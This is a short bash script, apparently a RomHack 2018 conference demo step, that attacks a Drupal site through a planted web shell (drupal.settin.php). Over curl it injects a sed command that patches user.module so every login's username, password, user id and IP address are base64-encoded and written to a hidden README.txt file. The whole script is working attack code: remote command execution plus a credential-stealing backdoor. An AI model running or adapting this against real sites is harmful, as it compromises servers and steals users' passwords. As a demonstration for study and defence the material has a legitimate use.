#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo 
echo "STAGE2 / STEP1"
echo "Patching Drupal user.module to steal credentials using drupal.settin.php system() call"
echo "Data stored in /sites/default/README.txt file"
echo
echo "Command executed:"
cat <<EOF
/bin/sed -i -e 's/ \$password);/ \$password);\nexec("echo ".base64_encode(\$form_state["values"]["name"].":".\$password.":".\$account->uid.":".ip_address()). " >> /var/www/html/drupal/sites/default/README.txt");/g' /var/www/html/drupal/modules/user/user.module
EOF
echo 
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' \
	--compressed \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Language: en-GB,en;q=0.5' \
	-H 'Connection: keep-alive' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'Pragma: no-cache' \
	-H 'Cache-Control: no-cache' \
	--data $'c=/bin/sed -i -e \'s/ $password);/ $password\\)\\;\\nexec("echo ".base64_encode($form_state[\"values\"][\"name\"].":".$password.":".$account->uid.":".ip_address()). " >> \\/var\\/www\\/html\\/drupal\\/sites\\/default\\/README.txt");/g\' /var/www/html/drupal/modules/user/user.module'
echo "------"
echo
